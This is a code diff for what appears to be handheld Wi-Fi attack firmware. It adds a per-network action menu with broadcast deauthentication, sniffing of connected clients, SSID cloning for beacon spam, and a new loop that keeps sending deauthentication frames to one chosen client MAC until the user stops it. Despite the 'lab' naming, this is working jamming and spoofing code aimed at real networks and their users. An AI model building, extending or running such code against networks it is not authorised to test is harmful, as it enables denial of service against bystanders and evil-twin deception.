@@ -21,6 +21,7 @@
 #include "BluetoothScanner.h"
 #include "BeaconSpam.h"
 #include "BleSpam.h"
+#include "ClientScanner.h"
 
 // ─────────────────────────────────────────────────────────────
 //  UI State machine
@@ -52,7 +53,10 @@ enum UiState {
   UI_BEACON_SPAM,
   UI_BLE_SPAM,
   UI_SNIFFER,
-  UI_IR_MENU
+  UI_IR_MENU,
+  UI_ACTION_MENU,
+  UI_CLIENT_LIST,
+  UI_CLIENT_SCANNING
 };
 
 // ─────────────────────────────────────────────────────────────
@@ -136,6 +140,14 @@ bool labInjectionStoppedByUser = false;
 
 int     selectedBleDevice = -1;
 int     bleListTop        = 0;
+
+// Action menu & client scanning state
+uint8_t actionMenuIndex   = 0;
+int     actionNetworkIdx  = -1;  // index of the network shown in action menu
+uint8_t clientListSel     = 0;
+uint8_t clientListTop     = 0;
+
+static const uint8_t ACTION_MENU_COUNT = 5;
 
 // ─────────────────────────────────────────────────────────────
 //  Button helpers
@@ -523,14 +535,12 @@ void handleOk() {
   }
 
   if (uiState == UI_NETWORK_DETAILS) {
-    if (targetHasSelection() && sameTarget(selectedNetwork)) {
-      runDeauthLab();
-    } else {
-      targetSet(wifiScannerNetwork(selectedNetwork));
-      labStatsReset(targetGet().bssid);
-      uiDrawNetworkDetails(wifiScannerNetwork(selectedNetwork), true);
-      waitForLabButtonsReleased();
-    }
+    // Open Action Menu for this network
+    actionNetworkIdx = selectedNetwork;
+    actionMenuIndex = 0;
+    uiState = UI_ACTION_MENU;
+    uiDrawActionMenu(wifiScannerNetwork(selectedNetwork), actionMenuIndex);
+    delay(200);
     return;
   }
 
@@ -635,9 +645,63 @@ void handleOk() {
       delay(200);
       return;
     }
-    uiState = UI_NETWORK_DETAILS;
-    uiDrawNetworkDetails(wifiScannerNetwork(selectedNetwork),
-                         targetHasSelection() && sameTarget(selectedNetwork));
+    // Also redirect Radar Network list to Action Menu
+    actionNetworkIdx = selectedNetwork;
+    actionMenuIndex = 0;
+    uiState = UI_ACTION_MENU;
+    uiDrawActionMenu(wifiScannerNetwork(selectedNetwork), actionMenuIndex);
+    delay(200);
+    return;
+  }
+
+  if (uiState == UI_ACTION_MENU) {
+    if (actionMenuIndex == 0) {
+      // Set Target
+      targetSet(wifiScannerNetwork(actionNetworkIdx));
+      labStatsReset(targetGet().bssid);
+      drawWifiMenu(); // Go back to wifi menu
+    }
+    else if (actionMenuIndex == 1) {
+      // Deauth Broadcast
+      targetSet(wifiScannerNetwork(actionNetworkIdx));
+      labStatsReset(targetGet().bssid);
+      runDeauthLab(); // run original deauth
+    }
+    else if (actionMenuIndex == 2) {
+      // Scan Clients
+      uint8_t targetMacBytes[6];
+      parseMacAddress(wifiScannerNetwork(actionNetworkIdx).bssid, targetMacBytes);
+      uiState = UI_CLIENT_SCANNING;
+      clientScanStart(wifiScannerNetwork(actionNetworkIdx).channel, targetMacBytes);
+      uiDrawGenericMessage("Scanning...", "Sniffing data frames...", "Wait 6s");
+    }
+    else if (actionMenuIndex == 3) {
+      // Clone SSID
+      beaconSpamSetCloneSSID(wifiScannerNetwork(actionNetworkIdx).ssid);
+      uiDrawGenericMessage("Clone Mode", "SSID Cloned!", "Run Beacon Spam");
+      delay(1500);
+      drawWifiMenu();
+    }
+    else if (actionMenuIndex == 4) {
+      // Back
+      uiState = UI_NETWORK_LIST;
+      uiDrawNetworkList(selectedBand, selectedNetwork, listTop);
+    }
+    delay(200);
+    return;
+  }
+
+  if (uiState == UI_CLIENT_LIST) {
+    if (clientListSel < clientScanCount()) {
+      // Deauth this specific client
+      targetSet(wifiScannerNetwork(actionNetworkIdx));
+      labStatsReset(targetGet().bssid);
+      runDeauthLabTargeted(clientScanGet(clientListSel).mac);
+    } else {
+      // Back button in list
+      uiState = UI_ACTION_MENU;
+      uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex);
+    }
     delay(200);
     return;
   }
@@ -657,6 +721,8 @@ void handleBack() {
   if (uiState == UI_BLE_MENU)         { drawMainMenu(); return; }
   if (uiState == UI_IR_MENU)          { drawMainMenu(); return; }
   if (uiState == UI_PLACEHOLDER)      { drawMainMenu(); return; }
+  if (uiState == UI_CLIENT_LIST)      { uiState = UI_ACTION_MENU; uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex); return; }
+  if (uiState == UI_ACTION_MENU)      { uiState = UI_NETWORK_LIST; uiDrawNetworkList(selectedBand, selectedNetwork, listTop); return; }
   if (uiState == UI_NETWORK_DETAILS)  { uiState = UI_NETWORK_LIST; uiDrawNetworkList(selectedBand, selectedNetwork, listTop); return; }
   if (uiState == UI_TARGET_DETAILS)   { drawWifiMenu(); return; }
   if (uiState == UI_ANALYZER)         { drawWifiMenu(); return; }
@@ -664,6 +730,26 @@ void handleBack() {
   if (uiState == UI_RADAR_BAND_MENU)  { drawWifiMenu(); return; }
   if (uiState == UI_RADAR_NETWORK_LIST) { uiState = UI_WIFI_RADAR; uiDrawWifiRadar(&radarNetwork, radarNetworkFound); return; }
   if (uiState == UI_LAB_PRECHECK || uiState == UI_TARGET_MONITOR || uiState == UI_LAB_STATS || uiState == UI_PRINCIPAL_TEST) { drawLabMenu(); return; }
+  if (uiState == UI_ACTION_MENU) {
+    actionMenuIndex = (actionMenuIndex + 1) % ACTION_MENU_COUNT;
+    uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex);
+    return;
+  }
+  
+  if (uiState == UI_CLIENT_LIST) {
+    uint8_t count = clientScanCount() + 1; // +1 for Back
+    clientListSel = (clientListSel + 1) % count;
+    if (clientListSel >= clientListTop + 4) {
+      clientListTop++;
+    } else if (clientListSel < clientListTop) {
+      clientListTop = clientListSel;
+    }
+    const char *macStrs[MAX_CLIENTS];
+    for(uint8_t i=0; i<clientScanCount(); i++) macStrs[i] = clientScanGet(i).macStr;
+    uiDrawClientList(macStrs, clientListSel, clientListTop, clientScanCount());
+    return;
+  }
+
   if (uiState == UI_SYSTEM_INFO)      { drawMainMenu(); return; }
   if (uiState == UI_BLE_DETAILS)      { uiState = UI_BLE_LIST; uiDrawBleList(selectedBleDevice, bleListTop); return; }
   if (uiState == UI_BLE_LIST)         { closeBleScanList(); return; }
@@ -908,6 +994,128 @@ void runDeauthLab() {
     uiDrawPrincipalTest(labTestGetReport());
   } else {
     returnToDeauthCaller(returnState);
+  }
+}
+
+// Forward declaration of runDeauthLabTargeted's inner function
+bool runPacketInjectionLabTargeted(const uint8_t *dstMac);
+
+void runDeauthLabTargeted(const uint8_t *dstMac) {
+  if (!targetHasSelection()) return;
+
+  const NetworkInfo &target = targetGet();
+  UiState returnState = uiState;
+
+  uiState = UI_LAB_PRECHECK;
+  uiDrawLabPrecheck(true, &target);
+  delay(600);
+
+  ledYellowOn();
+  uiDrawStatus("Setting up targeted...");
+
+  labInjectionStoppedByUser = false;
+  bool anySent = runPacketInjectionLabTargeted(dstMac);
+
+  ledYellowOff();
+
+  if (anySent) {
+    ledFlashGreen(2, 100);
+    buzzerSuccess();
+  } else {
+    ledFlashRed(2, 150);
+    buzzerError();
+  }
+
+  if (labStatsActive()) {
+    const LabStats &s = labStatsGet();
+    labTestSimulateDeauth(target, s.found > 0, s, anySent);
+    uiState = UI_PRINCIPAL_TEST;
+    uiDrawPrincipalTest(labTestGetReport());
+  } else {
+    returnToDeauthCaller(returnState);
+  }
+}
+
+bool runPacketInjectionLabTargeted(const uint8_t *dstMac) {
+  const NetworkInfo &target = targetGet();
+
+  uint8_t targetMac[6];
+  if (!parseMacAddress(target.bssid, targetMac)) {
+    uiDrawStatus("Bad MAC address");
+    ledFlashRed(3, 100);
+    buzzerError();
+    delay(900);
+    return false;
+  }
+
+  if (isInjectionBlockedSecurity(target.security)) {
+    uiDrawStatus("WPA3 - TX blocked");
+    ledFlashRed(2, 200);
+    buzzerError();
+    delay(900);
+    return false;
+  }
+
+  wifi_off();
+  delay(200);
+  if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
+    uiDrawStatus("WiFi init failed");
+    ledFlashRed(2, 200);
+    buzzerError();
+    delay(900);
+    return false;
+  }
+  wifi_change_channel_plan(0x25); // Force dual-band so 5G channels work
+  delay(200);
+
+  if (wifi_set_channel(target.channel) != RTW_SUCCESS) {
+    uiDrawStatus("Channel set failed");
+    ledFlashRed(2, 200);
+    buzzerError();
+    delay(900);
+    return false;
+  }
+
+  uiDrawTxCounter(0);
+
+  bool anySent = false;
+  uint32_t sentCount = 0;
+  uiDrawTxCounter(sentCount);
+
+  uint8_t dstMacBuf[6];
+  memcpy(dstMacBuf, dstMac, 6);
+
+  while (true) {
+    for (uint8_t burst = 0; burst < LAB_DEAUTH_CYCLE_LIMIT; burst++) {
+      if (labStopRequested()) {
+        return stopPacketInjectionLab(anySent, sentCount);
+      }
+
+      bool sent = wifi_tx_deauth_frame(targetMac, dstMacBuf, LAB_DEAUTH_REASON);
+      anySent = anySent || sent;
+      if (sent) {
+        sentCount++;
+        ledFlashGreen(1, 20);
+        buzzerClick();
+      } else {
+        ledFlashRed(1, 20);
+      }
+
+      uiDrawTxCounter(sentCount);
+      delay(LAB_DEAUTH_TX_GAP_MS);
+    }
+
+    if (labStopRequested()) {
+      return stopPacketInjectionLab(anySent, sentCount);
+    }
+
+    if (!rearmLabWifi(target.channel)) {
+      uiDrawStatus("WiFi rearm failed");
+      ledFlashRed(2, 100);
+      buzzerError();
+      delay(900);
+      return anySent;
+    }
   }
 }
 
@@ -1331,6 +1539,7 @@ void startSniffer(uint8_t band) {
     buzzerError();
   }
 }
+
 
 
 
